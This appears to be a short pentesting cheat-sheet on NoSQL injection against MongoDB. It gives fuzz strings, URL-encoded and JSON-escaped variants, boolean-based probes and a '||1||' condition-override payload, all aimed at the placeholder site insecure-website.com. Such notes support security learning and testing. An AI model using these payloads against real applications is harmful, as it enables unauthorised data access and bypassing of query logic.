# NoSQL Injections
There are two main types of NoSQL injections:
* Syntax injection (similar to sqli methodology)
* Operator injection
Most popular NoSQL DB is mongo  

## Example
User's query:
```
https://insecure-website.com/product/lookup?category=fizzy
```
Json query to mongo's collection:
```
this.category == 'fizzy'
```
Example of fuzz string (to detect any error):
```
'"`{
;$Foo}
$Foo \xYZ
```
And URL-encoded request:
```
https://insecure-website.com/product/lookup?category='%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00
```

Json adaptation of paylaod (to inject in parameters of request, not in URL):
```
'\"`{\r;$Foo}\n$Foo \\xYZ\u0000
```
Simple test is applying `'` and `\'`, In first step, request must be broken and when we escape the quote, request must be valid.  

### Confirming conditional behaviour
Next we can test for boolean-based attack:
```
' && 0 && 'x
' && 1 && 'x
https://insecure-website.com/product/lookup?category=fizzy'+%26%26+0+%26%26+'x
https://insecure-website.com/product/lookup?category=fizzy'+%26%26+1+%26%26+'x
```
If responses differ, we are able to influence boolean logic of application.  
### Overriding existing conditions
We can send payload similar to `' OR 1=1` in SQLi:
```
'||1||'
https://insecure-website.com/product/lookup?category=fizzy%27%7c%7c%31%7c%7c%27
```
Result in query:
```
this.category == 'fizzy'||'1'=='1'
```